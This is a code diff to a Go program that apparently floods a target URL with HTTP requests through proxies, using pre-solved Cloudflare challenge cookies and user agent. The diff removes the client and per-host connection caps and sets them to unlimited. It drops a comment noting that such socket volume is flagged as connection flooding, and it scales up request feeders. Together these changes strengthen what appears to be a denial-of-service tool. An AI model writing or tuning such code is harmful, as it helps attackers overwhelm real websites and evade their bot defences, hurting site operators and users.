@@ -210,29 +210,25 @@ func formatTestResult(tag string, statusCode int, err error) string {
 func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string, solveEnabled bool) {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
+	// No artificial cap — use thread count directly so the VPS decides the ceiling.
 	totalTargetClients := threads
-	if totalTargetClients > 40 {
-		totalTargetClients = 40
-	}
-	if totalTargetClients < 10 {
-		totalTargetClients = 10
+	if totalTargetClients < 1 {
+		totalTargetClients = 1
 	}
 
-	// MaxConnsPerHost cap. With HTTP/2 each connection multiplexes ~100 streams,
-	// so we don't need a connection per worker. Capping at 2x the idle pool size
-	// gives us burst headroom (new dials block briefly under spikes) without
-	// letting the client open thousands of TCP sockets per second - which
-	// Cloudflare/Akamai score as connection flooding and rate-limit.
-	const idlePerHost = 256
-	const maxPerHost = idlePerHost * 2
+	// Scale connection pools with workload. 0 = unlimited active connections.
+	idlePerHost := threads * streams
+	if idlePerHost < 256 {
+		idlePerHost = 256
+	}
 
 	baseOpts := []gofire.Option{
 		gofire.WithTimeout(10 * time.Second),
 		gofire.WithTLSHandshakeTimeout(8 * time.Second),
 		gofire.WithDialTimeout(8 * time.Second),
 		gofire.WithMaxIdleConnsPerHost(idlePerHost),
-		gofire.WithMaxIdleConns(1024),
-		gofire.WithMaxConnsPerHost(maxPerHost),
+		gofire.WithMaxIdleConns(0),
+		gofire.WithMaxConnsPerHost(0),
 		gofire.WithDNSCacheTTL(30 * time.Minute),
 		gofire.WithIdleConnTimeout(120 * time.Second),
 		gofire.WithMaxRedirects(3),
@@ -442,9 +438,14 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 		}
 	}
 
+	// Scale feeders with worker count so the job channel never starves.
+	feedersPerPipeline := workersPerClient / 8
+	if feedersPerPipeline < 4 {
+		feedersPerPipeline = 4
+	}
 	for _, cg := range groups {
 		for _, p := range cg.pipelines {
-			for i := 0; i < 4; i++ {
+			for i := 0; i < feedersPerPipeline; i++ {
 				feedWg.Add(1)
 				go feedPipeline(p)
 			}
